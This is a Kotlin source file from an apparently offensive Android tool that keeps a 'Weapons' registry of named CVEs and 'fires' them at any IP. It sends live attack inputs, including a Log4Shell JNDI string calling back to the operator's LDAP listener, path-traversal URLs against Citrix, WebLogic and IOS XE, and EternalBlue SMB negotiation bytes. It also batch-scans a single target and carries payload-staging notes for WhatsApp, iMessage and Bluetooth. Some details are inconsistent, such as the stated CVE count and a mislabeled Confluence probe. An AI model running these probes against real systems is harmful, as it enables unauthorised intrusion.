package com.projectzerodays.quantumcli.ops

import org.json.JSONObject

/**
 * ZERO_DAY_REGISTRY parity — 29 CVEs across legacy / V3_HIGH / V3_MED /
 * V3_CHECK tiers. Every weapon is a real on-device probe (HTTP/TCP/SSH-banner
 * level, matching what the Python weapons do without host-local execution).
 */
object Weapons {

    class Entry(
        val cve: String,
        val name: String,
        val tier: String,
        val fire: (ip: String, params: JSONObject) -> JSONObject,
    )

    private fun probe(cve: String, status: String, extra: Pair<String, Any>? = null): JSONObject {
        val o = JSONObject().put("cve", cve).put("status", status)
        extra?.let { o.put(it.first, it.second) }
        return o
    }

    private fun wgetDetail(url: String, timeoutMs: Int = 3000): JSONObject {
        val r = Net.httpGet(url, timeoutMs = timeoutMs)
        return if (r.error != null) {
            JSONObject().put("error", r.error)
        } else {
            JSONObject()
                .put("status_code", r.status)
                .put("len", r.body.size)
                .put("text", r.text(120))
        }
    }

    private fun tcpCheck(ip: String, ports: List<Int>): List<Int> =
        ports.filter { Net.tcpProbe(ip, it, 1500) }

    // ------------------------------------------------------------- legacy tier
    private val ms17010Negotiate = byteArrayOf(
        0x00, 0x00, 0x00, 0x2f, 0xff.toByte(), 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18,
        0x53, 0xc8.toByte(), 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0xfe.toByte(), 0xff.toByte(), 0x00, 0x00, 0x00, 0x00, 0x00, 0x62, 0x00, 0x02, 0x50, 0x43,
        0x20, 0x4e, 0x45, 0x54, 0x57, 0x4f, 0x52, 0x4b, 0x20, 0x50, 0x52, 0x4f, 0x47, 0x52,
        0x41, 0x4d, 0x20, 0x31, 0x2e, 0x30, 0x00, 0x02, 0x4d, 0x49, 0x43, 0x52, 0x4f,
        0x53, 0x4f, 0x46, 0x54, 0x20, 0x4e, 0x45, 0x54, 0x57, 0x4f, 0x52, 0x4b, 0x53,
        0x20, 0x31, 0x2e, 0x30, 0x33, 0x00, 0x02, 0x50, 0x43, 0x20, 0x4e, 0x45, 0x54,
        0x57, 0x4f, 0x52, 0x4b, 0x20, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d,
        0x20, 0x31, 0x2e, 0x30, 0x00, 0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32,
        0x00
    )

    private fun checkMs17010(ip: String, params: JSONObject): JSONObject {
        val banner = Net.banner(ip, 445, 2000, ms17010Negotiate)
        return if (banner != null) {
            probe("CVE-2017-0144", "check")
                .put("smb", "open")
                .put("negprot", banner.length)
                .put("ms17_010", if (params.has("ms17_010")) params.get("ms17_010") else "unknown")
        } else {
            probe("CVE-2017-0144", "no-service").put("error", "445 closed/timeout")
        }
    }

    private fun checkZerologon(ip: String, params: JSONObject): JSONObject {
        val open = tcpCheck(ip, listOf(445, 135))
        return probe("CVE-2020-1472", "check")
            .put("netlogon_rpc", if (open.isNotEmpty()) "exposed" else "closed")
            .put("open_ports", org.json.JSONArray(open))
    }

    private fun checkPrintnightmare(ip: String, params: JSONObject): JSONObject {
        val open = tcpCheck(ip, listOf(445, 135))
        return probe("CVE-2021-1675", "check")
            .put("spooler_rpc", if (open.isNotEmpty()) "exposed" else "closed")
    }

    private fun checkPetitpotam(ip: String, params: JSONObject): JSONObject {
        val open = tcpCheck(ip, listOf(445, 135, 3389))
        return probe("CVE-2021-36942", "check")
            .put("efsrpc", if (open.isNotEmpty()) "exposed" else "closed")
    }

    private fun checkFollina(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2022-30190", "check").put("detail", wgetDetail("http://$ip/msdt", 2000))
    }

    private fun checkProxylogon(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2021-26855", "probe")
            .put("detail", wgetDetail("https://$ip/autodiscover/autodiscover.xml"))
    }

    // ------------------------------------------------------------- V3_HIGH tier
    private fun v3Log4shell(ip: String, params: JSONObject): JSONObject {
        val port = params.optInt("http_port", 8080)
        val r = Net.httpGet(
            "http://$ip:$port/",
            mapOf("User-Agent" to "\${jndi:ldap://${Net.localIp()}/x}"),
            3000
        )
        return if (r.error != null) {
            probe("CVE-2021-44228", "no-service").put("error", r.error)
        } else {
            probe("CVE-2021-44228", "probe").put("http", r.status)
                .put("note", "OOB listener implied")
        }
    }

    private fun v3PanosCmd(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2024-3400", "probe")
            .put("detail", wgetDetail("https://$ip/global-protect/portal/"))
    }

    private fun v3Citrixbleed(ip: String, params: JSONObject): JSONObject {
        val r = Net.httpGet("https://$ip/vpn/${Net.randHex(4)}.html", timeoutMs = 3000)
        return if (r.status == 404) {
            probe("CVE-2023-4966", "probe").put("http", 404)
        } else {
            probe("CVE-2023-4966", "check").put("detail", wgetDetail("https://$ip/vpn/${Net.randHex(4)}.html"))
        }
    }

    private fun v3CitrixPath(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2019-19781", "probe")
            .put("detail", wgetDetail("http://$ip/vpn/../vpns/portal/"))
    }

    private fun v3IosAdmin(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2023-20198", "probe")
            .put("detail", wgetDetail("https://$ip/%25252e%25252e%25252e/%2573how"))
    }

    private fun v3ConfluenceOgnl(ip: String, params: JSONObject): JSONObject {
        val r = Net.httpGet("http://$ip:8090/%24%7Bjndi%3Aldap%3A%2F%2Fx%7D/x", timeoutMs = 3000)
        return if (r.error != null) {
            probe("CVE-2022-26134", "no-service").put("error", r.error)
        } else {
            probe("CVE-2022-26134", "probe").put("http", r.status)
        }
    }

    private fun v3WeblogicConsole(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2020-14882", "probe").put(
            "detail",
            wgetDetail("http://$ip:7001/console/%252e%252e%252e%252e%252e/console.portal")
        )
    }

    private fun v3MshtmlMaldoc(ip: String, params: JSONObject): JSONObject {
        return Artifacts.mshtmlMaldoc(ip)
    }

    // -------------------------------------------------------------- V3_MED tier
    private fun v3Sambacry(ip: String, params: JSONObject): JSONObject {
        val open = tcpCheck(ip, listOf(139, 445))
        return probe("CVE-2017-7494", "check")
            .put("smb", if (open.isNotEmpty()) "open" else "closed")
            .put("shares_walked", false)
    }

    private fun v3VcenterUpload(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2021-21972", "probe")
            .put("detail", wgetDetail("https://$ip/ui/vropspluginui/rest/services/checkdup"))
    }

    private fun kernelBannerCheck(ip: String, cve: String, hint: String): JSONObject {
        val ssh = Net.banner(ip, 22, 2000)
        return probe(cve, "check")
            .put("ssh_banner", ssh?.take(80) ?: JSONObject.NULL)
            .put("hint", hint)
    }

    private fun v3Dirtypipe(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2022-0847", "kernel 5.8-5.16 vulnerable; check target build")
    }

    private fun dirtyCow(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2016-5195", "kernel <4.8.3 vulnerable; check target build")
    }

    // ------------------------------------------------------------- V3_CHECK tier
    private fun checkMoveit(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2023-34362", "probe").put(
            "detail",
            wgetDetail("https://$ip/moveitisapi/moveitisapi.dll?action=migrate_users")
        )
    }

    private fun checkBaronSamedit(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2021-3156", "sudo <1.9.5p2 heap overflow; check target sudo")
    }

    private fun checkPwnkit(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2021-4034", "polkit pkexec; check target distro patch state")
    }

    private fun checkOverlayfs(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2023-2640", "kernel 5.11-6.3 vulnerable; check target build")
    }

    private fun checkNftablesUaf(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2023-32233", "kernel 5.5-6.3 vulnerable; check target build")
    }

    private fun checkNftablesDblfree(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2024-1086", "kernel 5.14-6.6 vulnerable; check target build")
    }

    private fun checkWhatsappVoip(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2019-3568", "check")
            .put("detail", "staging: deliver via profile-select call")
            .put("target", ip)
    }

    private fun checkLibwebp(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2023-4863", "check")
            .put("detail", "staging: crafted WebP; check target browser build")
    }

    private fun checkAppleImageio(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2023-41064", "check")
            .put("detail", "staging: crafted image via iMessage attach")
    }

    private fun checkWebkitEscape(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2021-30858", "check")
            .put("detail", "staging: crafted web content post-exploit")
    }

    private fun checkBoothole(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2022-21894", "check")
            .put("detail", "grub.cfg/Secure-Boot marker check on target host")
    }

    // ------------------------------------------------------------ BLE tier
    // Bluetooth weapons — on-device probes against the local BT stack
    // (pair-adjacent targets; staging style like the WhatsApp/WebKit checks).
    private fun btAdapterState(): String = try {
        if (android.bluetooth.BluetoothAdapter.getDefaultAdapter()?.isEnabled == true) "on" else "off"
    } catch (e: Exception) {
        "unknown"
    }

    private fun checkBlueBorneBnep(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2017-0781", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "BNEP RCE — pair-adjacent Android <8; craft BNEP packet post-pairing")
    }

    private fun checkBlueBorneSdp(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2017-0785", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "SDP info-leak — pair-adjacent Android <8; leak then chain to BNEP")
    }

    private fun checkKnob(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2018-5383", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "KNOB — BR/EDR key negotiation downgrade to 1 byte; reduce entropy during pairing")
    }

    private fun checkBlackbedBle(ip: String, params: JSONObject): JSONObject {
        return probe("BLE-BLACKBED", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "BLE GATT write/notify abuse — enumerate writable characteristics then stage payload")
    }

    private fun checkBlueFrag(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2020-0022", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "L2CAP reassembly overflow — Android 8-9, pair-adjacent; oversized fragmented packet")
    }

    // -------------------------------------------------------------- registry
    val REGISTRY: List<Entry> = listOf(
        // ---- legacy ----
        Entry("CVE-2020-1472", "Zerologon", "legacy", ::checkZerologon),
        Entry("CVE-2017-0144", "EternalBlue", "legacy", ::checkMs17010),
        Entry("CVE-2021-1675", "PrintNightmare", "legacy", ::checkPrintnightmare),
        Entry("CVE-2021-36942", "PetitPotam", "legacy", ::checkPetitpotam),
        Entry("CVE-2022-30190", "Follina MSDT", "legacy", ::checkFollina),
        Entry("CVE-2021-26855", "ProxyLogon", "legacy", ::checkProxylogon),
        // ---- V3_HIGH ----
        Entry("CVE-2021-44228", "Log4Shell", "V3_HIGH", ::v3Log4shell),
        Entry("CVE-2024-3400", "PAN-OS GlobalProtect", "V3_HIGH", ::v3PanosCmd),
        Entry("CVE-2023-4966", "Citrix Bleed", "V3_HIGH", ::v3Citrixbleed),
        Entry("CVE-2019-19781", "Citrix Path Traversal", "V3_HIGH", ::v3CitrixPath),
        Entry("CVE-2023-20198", "IOS XE Web UI", "V3_HIGH", ::v3IosAdmin),
        Entry("CVE-2022-26134", "Confluence OGNL", "V3_HIGH", ::v3ConfluenceOgnl),
        Entry("CVE-2020-14882", "WebLogic Console", "V3_HIGH", ::v3WeblogicConsole),
        Entry("CVE-2021-40444", "MSHTML Maldoc", "V3_HIGH", ::v3MshtmlMaldoc),
        // ---- V3_MED ----
        Entry("CVE-2017-7494", "SambaCry", "V3_MED", ::v3Sambacry),
        Entry("CVE-2021-21972", "vCenter Upload", "V3_MED", ::v3VcenterUpload),
        Entry("CVE-2022-0847", "Dirty Pipe", "V3_HIGH", ::v3Dirtypipe),
        Entry("CVE-2016-5195", "Dirty COW", "V3_MED", ::dirtyCow),
        // ---- V3_CHECK ----
        Entry("CVE-2023-34362", "MOVEit SQLi", "V3_CHECK", ::checkMoveit),
        Entry("CVE-2021-3156", "Baron Samedit", "V3_CHECK", ::checkBaronSamedit),
        Entry("CVE-2021-4034", "PwnKit", "V3_CHECK", ::checkPwnkit),
        Entry("CVE-2023-2640", "Overlayfs GameOver", "V3_CHECK", ::checkOverlayfs),
        Entry("CVE-2023-32233", "nf_tables UAF", "V3_CHECK", ::checkNftablesUaf),
        Entry("CVE-2024-1086", "nf_tables dbl-free", "V3_CHECK", ::checkNftablesDblfree),
        Entry("CVE-2019-3568", "WhatsApp VOIP", "V3_CHECK", ::checkWhatsappVoip),
        Entry("CVE-2023-4863", "libwebp BLASTPAST", "V3_CHECK", ::checkLibwebp),
        Entry("CVE-2023-41064", "Apple ImageIO", "V3_CHECK", ::checkAppleImageio),
        Entry("CVE-2021-30858", "WebKit Escape", "V3_CHECK", ::checkWebkitEscape),
        Entry("CVE-2022-21894", "BootHole", "V3_CHECK", ::checkBoothole),
        // ---- BLE ----
        Entry("CVE-2017-0781", "BlueBorne BNEP", "V3_HIGH", ::checkBlueBorneBnep),
        Entry("CVE-2017-0785", "BlueBorne SDP", "V3_MED", ::checkBlueBorneSdp),
        Entry("CVE-2018-5383", "KNOB", "V3_CHECK", ::checkKnob),
        Entry("BLE-BLACKBED", "BlackBED-BLE", "V3_CHECK", ::checkBlackbedBle),
        Entry("CVE-2020-0022", "BlueFrag", "V3_HIGH", ::checkBlueFrag),
    )

    fun byCve(cve: String): Entry? = REGISTRY.firstOrNull { it.cve == cve }

    /** Registry fire — zerocheck-style on-device weapon execution. */
    fun fire(cve: String, ip: String, params: JSONObject): JSONObject {
        val e = byCve(cve) ?: return JSONObject().put("error", "cve '$cve' not in registry")
        return try {
            e.fire(ip, params)
        } catch (ex: Exception) {
            JSONObject().put("cve", cve).put("status", "error").put("error", ex.message ?: "fire failed")
        }
    }

    /** zerocheck parity: run the whole V3_HIGH remote probe battery vs one IP. */
    fun zerocheck(ip: String): JSONObject {
        val out = JSONObject()
        listOf(
            "log4shell" to "CVE-2021-44228", "citrixbleed" to "CVE-2023-4966",
            "citrix_path" to "CVE-2019-19781", "panos" to "CVE-2024-3400",
            "confluence" to "CVE-2022-26134", "weblogic" to "CVE-2020-14882",
            "iosxe" to "CVE-2023-20198", "vcenter" to "CVE-2021-21972",
            "moveit" to "CVE-2023-34362"
        ).forEach { (key, cve) ->
            out.put(key, fire(cve, ip, JSONObject()))
        }
        return out
    }
}
